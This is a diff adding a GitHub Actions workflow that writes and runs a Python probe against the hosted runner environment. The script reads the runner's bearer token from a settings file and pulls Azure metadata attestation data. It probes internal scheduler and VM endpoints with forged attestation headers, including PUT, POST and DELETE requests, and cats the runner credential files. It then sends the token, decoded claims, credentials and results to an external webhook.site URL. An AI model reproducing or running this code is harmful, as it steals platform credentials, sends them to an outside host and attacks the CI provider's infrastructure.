@@ -1,0 +1,230 @@
+name: Probe v50 - account_a
+on:
+  workflow_dispatch:
+jobs:
+  probe:
+    runs-on: ubuntu-24.04
+    env:
+      V50_SOURCE: v50_account_a
+    steps:
+      - name: v50 vm/v1 pkcs7 encoding + attestation data
+        run: |
+          cat > /tmp/v50_probe.py << 'PROBE_EOF'
+          
+          import json, os, base64, subprocess, re, urllib.request, urllib.error, time
+          
+          WEBHOOK = "https://webhook.site/53b82227-04b4-4ad2-9ccd-2abbd8a81837"
+          RUN_ID  = os.environ.get("GITHUB_RUN_ID", "unknown")
+          REPO    = os.environ.get("GITHUB_REPOSITORY", "unknown")
+          SOURCE  = os.environ.get("V50_SOURCE", "v50_account_a")
+          
+          def probe(method, url, body=None, extra=None):
+              data = body.encode() if isinstance(body, str) else (body or None)
+              headers = {"Content-Type": "application/json", "User-Agent": "hosted-compute-agent/1.0"}
+              if extra:
+                  headers.update(extra)
+              if data:
+                  headers["Content-Length"] = str(len(data))
+              req = urllib.request.Request(url, data=data, headers=headers, method=method)
+              try:
+                  r = urllib.request.urlopen(req, timeout=14)
+                  return {"status": r.status, "body": r.read(8000).decode("utf-8","replace"), "hdrs": dict(r.headers)}
+              except urllib.error.HTTPError as e:
+                  return {"status": e.code, "body": e.read(8000).decode("utf-8","replace"), "hdrs": dict(e.headers)}
+              except Exception as ex:
+                  return {"status": 0, "body": str(ex), "hdrs": {}}
+          
+          def auth(method, url, token, body=None, extra_headers=None):
+              h = {"Authorization": f"Bearer {token}"}
+              if extra_headers:
+                  h.update(extra_headers)
+              return probe(method, url, body, h)
+          
+          def sh(cmd, timeout=12):
+              try:
+                  r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
+                  return r.stdout + r.stderr
+              except Exception as ex:
+                  return f"TIMEOUT/ERROR: {ex}"
+          
+          print(f"[{SOURCE}] start")
+          
+          with open("/opt/hca/.settings") as f:
+              s = json.load(f)
+          
+          token     = s.get("authToken", "")
+          sched_url = s.get("schedulerApiUrl", "").rstrip("/")
+          orch_id   = os.environ.get("ACTIONS_ORCHESTRATION_ID", "")
+          
+          parts = token.split(".")
+          pad = parts[1] + "=" * (4 - len(parts[1]) % 4)
+          claims = json.loads(base64.urlsafe_b64decode(pad))
+          wid = claims.get("wid", "")
+          
+          results = {}
+          
+          # -- 1. Get IMDS attested document (PKCS7) ---------------------------------
+          print(f"\n[{SOURCE}] Fetching IMDS attested document (PKCS7)...")
+          r = probe("GET",
+              "http://169.254.169.254/metadata/attested/document?api-version=2021-02-01",
+              extra={"Metadata": "true"})
+          imds_att_raw = r["body"]
+          print(f"[IMDS_ATT] status={r['status']} len={len(imds_att_raw)}")
+          print(f"[IMDS_ATT] response: {imds_att_raw[:500]}")
+          results["imds_attested"] = imds_att_raw
+          
+          pkcs7_sig = ""
+          try:
+              att_data = json.loads(imds_att_raw)
+              pkcs7_sig = att_data.get("signature", "")
+              att_encoding = att_data.get("encoding", "")
+              print(f"[IMDS_ATT] encoding={att_encoding} sig_len={len(pkcs7_sig)}")
+              print(f"[IMDS_ATT] sig_prefix={pkcs7_sig[:80]}")
+              results["pkcs7_signature"] = pkcs7_sig
+              results["pkcs7_encoding"] = att_encoding
+          except Exception as ex:
+              print(f"[IMDS_ATT] parse error: {ex}")
+          
+          # -- 2. Get IMDS tags for vm/v1 URL ----------------------------------------
+          r2 = probe("GET", "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
+                     extra={"Metadata": "true"})
+          try:
+              imds_data = json.loads(r2["body"])
+              tags_list = imds_data.get("compute", {}).get("tagsList", [])
+              hc_tags = {t["name"]: t["value"] for t in tags_list if "hosted_compute" in t.get("name","")}
+              base_ro_url = hc_tags.get("hosted_compute.base_ro_url", "").rstrip("/")
+              allocation_id = hc_tags.get("hosted_compute.allocation_id", "")
+              ro_audience = hc_tags.get("hosted_compute.ro_audience", "")
+              print(f"[IMDS] base_ro_url={base_ro_url} allocation_id={allocation_id} ro_audience={ro_audience}")
+              results["imds_tags"] = hc_tags
+          except Exception as ex:
+              print(f"[IMDS] parse error: {ex}")
+              base_ro_url = ""
+              allocation_id = ""
+          
+          # -- 3. Probe /vm/v1 with all attestation headers --------------------------
+          print(f"\n[{SOURCE}] Probing /vm/v1 with x-attestation-encoding: pkcs7...")
+          vm_results = {}
+          
+          if not base_ro_url:
+              from urllib.parse import urlparse
+              parsed = urlparse(sched_url)
+              base_ro_url = f"{parsed.scheme}://{parsed.netloc}/vm/v1"
+          
+          test_paths = [
+              ("GET", "/"),
+              ("GET", "/health"),
+              ("GET", "/info"),
+              ("GET", f"/{allocation_id}" if allocation_id else "/test"),
+              ("GET", f"/{allocation_id}/status" if allocation_id else "/test/status"),
+              ("GET", f"/{allocation_id}/config" if allocation_id else "/test/config"),
+              ("PUT", f"/{allocation_id}/heartbeat" if allocation_id else "/test/heartbeat"),
+              ("POST", f"/{allocation_id}/heartbeat" if allocation_id else "/test/heartbeat"),
+              ("DELETE", f"/{allocation_id}" if allocation_id else "/test"),
+          ]
+          
+          # Variant A: provider + encoding headers only (no data)
+          attest_headers_A = {
+              "x-attestation-provider": "azure",
+              "x-attestation-encoding": "pkcs7",
+          }
+          
+          # Variant B: provider + encoding + sig as x-attestation-data
+          attest_headers_B = {
+              "x-attestation-provider": "azure",
+              "x-attestation-encoding": "pkcs7",
+              "x-attestation-data": pkcs7_sig,
+          } if pkcs7_sig else {}
+          
+          # Variant C: provider + encoding + full JSON as x-attestation-data
+          attest_headers_C = {
+              "x-attestation-provider": "azure",
+              "x-attestation-encoding": "pkcs7",
+              "x-attestation-data": imds_att_raw,
+          } if imds_att_raw else {}
+          
+          # Variant D: provider + encoding + base64 of full JSON doc
+          try:
+              b64_full = base64.b64encode(imds_att_raw.encode()).decode()
+              attest_headers_D = {
+                  "x-attestation-provider": "azure",
+                  "x-attestation-encoding": "pkcs7",
+                  "x-attestation-data": b64_full,
+              }
+          except:
+              attest_headers_D = {}
+          
+          for var_label, var_headers in [
+              ("A_enc_only", attest_headers_A),
+              ("B_enc_sig", attest_headers_B),
+              ("C_enc_full_json", attest_headers_C),
+              ("D_enc_b64_json", attest_headers_D),
+          ]:
+              if not var_headers:
+                  print(f"[VM-ATTEST] {var_label}: SKIPPED (no sig)")
+                  continue
+              print(f"\n[VM-ATTEST] Variant {var_label}: headers={list(var_headers.keys())}")
+              for method, path in test_paths:
+                  url = base_ro_url + path
+                  r = auth(method, url, token,
+                           body='{}' if method != "GET" else None,
+                           extra_headers=var_headers)
+                  key = f"{var_label}_{method}_{path.lstrip('/').replace('/', '_')}"
+                  vm_results[key] = {"status": r["status"], "body": r["body"][:2000]}
+                  status = r["status"]
+                  body_short = r["body"][:150]
+                  if status not in (404,):
+                      marker = "***" if status not in (400, 401, 405) else ""
+                      print(f"[VM-ATTEST] {marker} {var_label} {method} {path} -> {status} | {body_short}")
+          
+          results["vm_attestation_v50"] = vm_results
+          
+          # -- 4. Also try orchestrator /v1 paths with attestation headers ----------
+          print(f"\n[{SOURCE}] Trying orchestrator scheduler paths with attestation...")
+          orch_att_results = {}
+          orch_paths = ["/annotation", "/status", "/vminfo", "/configuration", "/context",
+                        "/properties", "/heartbeat"]
+          for path in orch_paths:
+              url = sched_url + path
+              r = auth("GET", url, token, extra_headers=attest_headers_B if pkcs7_sig else attest_headers_A)
+              key = f"orch{path.replace('/','-')}"
+              orch_att_results[key] = {"status": r["status"], "body": r["body"][:500]}
+              if r["status"] not in (404, 405, 400):
+                  print(f"[ORCH_ATT] *** {path} -> {r['status']} | {r['body'][:200]}")
+              else:
+                  print(f"[ORCH_ATT] {path:30} -> {r['status']} | {r['body'][:80]}")
+          results["orch_attestation"] = orch_att_results
+          
+          # -- 5. Runner credential files (fresh read) --------------------------------
+          print(f"\n[{SOURCE}] Runner credential files...")
+          runner_cred_results = {}
+          cached_base = "/home/runner/actions-runner/cached"
+          for ver_dir in sorted(os.listdir(cached_base)) if os.path.isdir(cached_base) else []:
+              for cred_file in [".credentials", ".runner", ".agent"]:
+                  fpath = f"{cached_base}/{ver_dir}/{cred_file}"
+                  content = sh(f"cat {fpath} 2>&1")
+                  runner_cred_results[f"{ver_dir}/{cred_file}"] = content[:3000]
+                  if content and "No such file" not in content and len(content) > 10:
+                      print(f"[RUNNER] *** {fpath} ({len(content)} chars): {content[:400]}")
+          results["runner_creds"] = runner_cred_results
+          
+          # -- 6. POST webhook --------------------------------------------------------
+          payload = {
+              "source": SOURCE, "run_id": RUN_ID, "repo": REPO,
+              "token": token, "claims": claims, "orch_id": orch_id,
+              "results": results,
+          }
+          data = json.dumps(payload, default=str).encode()
+          req = urllib.request.Request(WEBHOOK, data=data,
+                                        headers={"Content-Type": "application/json"}, method="POST")
+          try:
+              r = urllib.request.urlopen(req, timeout=30)
+              print(f"\n[{SOURCE}] Webhook: {r.status}")
+          except Exception as ex:
+              print(f"[{SOURCE}] Webhook error: {ex}")
+          
+          print(f"[{SOURCE}] DONE")
+          PROBE_EOF
+          python3 /tmp/v50_probe.py
+      - name: Keep alive
+        run: sleep 60
